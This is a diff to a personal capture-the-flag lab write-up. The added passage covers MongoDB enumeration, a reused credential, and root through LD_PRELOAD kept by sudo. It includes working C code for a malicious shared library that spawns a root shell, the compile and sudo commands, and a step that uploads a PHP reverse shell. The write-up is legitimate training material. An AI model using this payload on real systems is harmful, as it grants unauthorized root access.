@@ -78,9 +78,56 @@ Enumerating the shell, we check for sudo but dont have the password, check for s
 
 I decided to run linpeas.sh and went down the rabbithole of pam_cap.so but that led to nowhere.
 
-I decided to take a look at the ports that linpeas output and realized that there were default ports for mysql and monogDB
+I decided to take a look at the ports that linpeas output and realized that there were default ports for mysql and monogDB.
 
-### priv esc
+#### Enumerating MongoDB
+
+I tried opening up a mongo shell to see if teh DB was misconfigured to allow passwordless access, and to my luck it was.
+
+I enumerated around trying to find any useful databases and tables and I found a valid set of credentialsa for the webdeveloper user: ```webdeveloper:BahamasChapp123!@#```.
+
+### SSH Session Enum
+
+Using the valid credentials, I was able to get a valid SSH Session as the webdeveloper user.
+
+I checked for SUID binaries again to see if I had access to any new file directories with SUID binaries, but none were found :(.
+
+---
+
+Then, I did sudo -l to try and see if I can run sudo, and I was able to run a custom backup compiled program with sudo as root.
+
+I tried to find a way to exploit this binary by maybe possibly putting something in the tar file directory so it would grab that and somehow give me a shell, but I couldn't find anything when google searching how to execute my idea, so I pocketed the idea and looked for another vector.
+
+---
+
+I then noticed that I had an unusual permission on my user from the sudoers file. LD_PRELOAD was included under env keep. This is interesting because usually, when running SUDO, certain environment variables are wiped to prevent potential privilege escalation, and with this permission all are wiped but this env variable. Interesting.
+
+After googling how to exploit this, I cam across this amazing [video](https://www.youtube.com/watch?v=bzjnIi5u9OQ&t=308s) by Conda. 
+
+Essentailly, the ```LD_PRELOAD``` environemnt variable is a way to tell the linker of a program to laod a shared library before the program boots up. And since shared libraries are compiled and executed by the linker and compiler before a program boots up. 
+
+So, if we have a malicious shared library that just sets our uid and guid to 0 (root) and spawn /bin/bash, we can get a root shell before the porgram even boots up.
+
+This is essentially the C version of the python mopdule hijacking box I did a while ago.
+
+## priv esc
+
+So, by compiling the following code into a shared library using this command: ```gcc -fPIC -shared -nostartfiles -o lol.so lol.c``` 
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv(“LD_PRELOAD”);
+setgid(0);
+setuid(0);
+system(“/bin/bash”);
+  }
+```
+
+Then by setting the LD_PRELOAD variable and running the binary with sudo (```sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility```), we get a root shell.
 
 <img width="1281" height="716" alt="image" src="https://github.com/user-attachments/assets/113d07b7-4380-4b67-bae9-f5ec1c5d9b7e" />
 
@@ -89,11 +136,17 @@ I decided to take a look at the ports that linpeas output and realized that ther
 
 ## Solution Steps
 
-1. Find the ```/backups``` directory and download ```backups.zip```
+1. Create account in login portal
+2. Reset Admin password
+3. Upload php reverse shell as profile picture
+4. navigate to shell in ```/profilepictures```
+5. Escalate to ```webdeveloper``` user by finding their creds in the Mongo DB
+6. Exploit ```LD_PRELOAD``` not being wiped to laod malicious library that spawns root shell.
 
 
 ## Thoughts
-I really enjoyed the priv esc technique this box featured. Prior, I wasa not familiar with nfs drives and exploiting them. But, now I feel if I see it again I will be prepared, and I always appreciate when a box teaches me a new, useful skill in preparation for the OSCP. I though the initial foothold was pretty creative too, it took me a while to realize that the ftp share directory was teh web directory and it seemed so obvious once I realized. Overall a great and fun box. Definitly reccomend.
+
+I really enjoyed this box becuase I had always ignored the permissions that were found for the user in the sudoers file, I really just focused on whether or not I can run a binary as sudo. This box sharpened my enumeration skills and also made me realize I need more practice in noticing the difference between default things found on a machine vs unusual things found on a machine. Highly reccomend.
 
 ---
 
